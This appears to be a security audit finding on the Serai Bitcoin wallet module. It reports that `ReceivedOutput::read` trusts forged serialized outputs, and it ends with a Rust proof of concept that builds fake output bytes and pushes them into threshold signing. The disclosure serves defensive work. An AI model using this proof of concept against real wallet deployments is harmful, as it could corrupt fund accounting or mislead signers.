### Title
Forged `ReceivedOutput` bytes report unspendable Bitcoin inputs as spendable - ([File: networks/bitcoin/src/wallet/mod.rs](networks/bitcoin/src/wallet/mod.rs))

### Summary
`ReceivedOutput::read` deserializes an output’s spending offset, claimed `TxOut`, and claimed `OutPoint` without proving that the outpoint exists or that it resolves to the supplied `TxOut`. `SignableTransaction::new` then trusts the serialized output amount and outpoint as inputs, while `SignableTransaction::multisig` only checks that the claimed script matches the offset-derived key. Consequently, attacker-supplied bytes can cause an invalid, unavailable, or mismatched UTXO to be treated as spendable funds.

### Finding Description
`ReceivedOutput::read` accepts three independent fields: `offset`, `output`, and `outpoint`. It canonically decodes the offset and consensus-decodes the remaining fields, but performs no consistency check between them and no blockchain lookup. [1](#0-0) 

`SignableTransaction::new` uses the deserialized `output.value` to compute `input_sat` and uses the deserialized `outpoint` as the transaction input. [2](#0-1) 

The later multisig check only verifies `p2tr_script_buf(key + offsetG) == prevouts[i].script_pubkey`; it does not verify that `prevouts[i]` is the actual output referenced by `tx.input[i].previous_output`. [3](#0-2) 

### Impact Explanation
An unprivileged party who can supply bytes to `ReceivedOutput::read` can claim an arbitrary amount at an arbitrary outpoint while using a script that corresponds to the serialized offset. The wallet can then construct and threshold-sign a Taproot transaction for an input that does not exist, is already spent, or whose real amount/script differs from the claimed `TxOut`. The resulting transaction is rejected by Bitcoin consensus or sighash validation, despite the deserialized object being represented as spendable and being counted toward available funds. This can freeze wallet accounting or trick the threshold into signing a transaction that can never spend the reported funds.

### Likelihood Explanation
The malicious input is only serialized data accepted by the public `ReceivedOutput::read` API, which the requested attack surface explicitly exposes. The attacker does not need a valid signature, private key, validator privilege, or control over Bitcoin consensus; they only need to supply a canonical scalar and syntactically valid consensus encodings. Exploitation requires an integrator to accept untrusted `ReceivedOutput` objects rather than exclusively persisting outputs returned by `Scanner::scan_transaction`, but the public deserialization API provides no defense against that misuse.

### Recommendation
Do not make `ReceivedOutput` deserializable as an authoritative spendable-output record. Either remove `ReceivedOutput::read` from untrusted-input paths or store enough authenticated state to prove the output was produced by the scanner. Before constructing `SignableTransaction`, resolve each `outpoint` against the Bitcoin UTXO set and require the chain-provided `TxOut` to exactly match the serialized `TxOut`; additionally re-check that the script equals the offset-derived P2TR script. Treat the serialized `TxOut` as a cache hint only, never as evidence of funds.

### Proof of Concept
```rust
use blackvul_serai::networks::bitcoin::wallet::{ReceivedOutput, SignableTransaction};
use bitcoin::{
  Amount, OutPoint, ScriptBuf, TxOut, Txid, hashes::Hash,
};
use frost::{curve::Secp256k1, ThresholdKeys, sign::*};
use k256::Scalar;

fn forged_received_output(
  keys: &ThresholdKeys<Secp256k1>,
  claimed_sats: u64,
) -> Vec<u8> {
  // A syntactically valid offset for the victim's untweaked key.
  let offset = Scalar::ZERO;

  // The script passes `multisig`, but this TxOut was not obtained from chain data.
  let fake_txout = TxOut {
    value: Amount::from_sat(claimed_sats),
    script_pubkey: blackvul_serai::networks::bitcoin::wallet::p2tr_script_buf(
      keys.group_key(),
    )
    .unwrap(),
  };

  // This may be nonexistent, spent, or point to a completely different TxOut.
  let fake_outpoint = OutPoint {
    txid: Txid::from_raw_hash(Hash::all_zeros()),
    vout: 0,
  };

  let mut encoded = Vec::new();
  encoded.extend(offset.to_bytes());
  encoded.extend(bitcoin::consensus::serialize(&fake_txout));
  encoded.extend(bitcoin::consensus::serialize(&fake_outpoint));
  encoded
}

fn exploit(keys: &ThresholdKeys<Secp256k1>) {
  let bytes = forged_received_output(keys, 100_000_000);
  let received = ReceivedOutput::read(&mut bytes.as_slice()).unwrap();

  // The fake input contributes 1 BTC to `input_sat`.
  let signable = SignableTransaction::new(
    vec![received],
    &[(ScriptBuf::new_op_return(&[]), 546)],
    None,
    None,
    10,
  )
  .unwrap();

  // Key/script validation passes even though the referenced outpoint is fake.
  let machine = signable.multisig(keys).unwrap();
  let (_sign_machine, _preprocess) = machine.preprocess(&mut rand_core::OsRng);
}
```
